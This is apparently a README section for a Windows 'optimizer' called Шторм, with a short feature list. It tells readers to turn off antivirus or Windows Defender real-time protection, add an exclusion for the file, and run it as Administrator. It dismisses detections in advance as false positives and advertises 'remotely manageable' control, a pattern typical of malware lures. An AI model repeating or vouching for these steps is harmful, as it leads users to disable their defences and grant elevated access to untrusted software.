### 🛡️ Antivirus & Bloatware Removal
**Note:** Because Шторм deeply optimizes Windows and disables system **bloatware** (telemetry, useless background services, and tracking), it may be flagged as a **False Positive** by your antivirus.

To ensure the optimizer can modify system registry keys and remove deep-seated bloatware:
1. **Disable Real-time protection** in your Antivirus/Windows Defender.
2. **Add an exclusion** for the file if necessary.
3. **Run as Administrator** is required for kernel-level optimizations.

### 🛠️ Key Features
* ✅ **System Tweaker:** Clean and accelerate your PC by removing unnecessary Windows bloatware.
* ✅ **Network Manager:** Analyze your connection and stabilize your latency.
* ✅ **Security Suite:** Protect sensitive data and manage critical processes.
* ✅ **Live Control:** Fully configurable and remotely manageable.
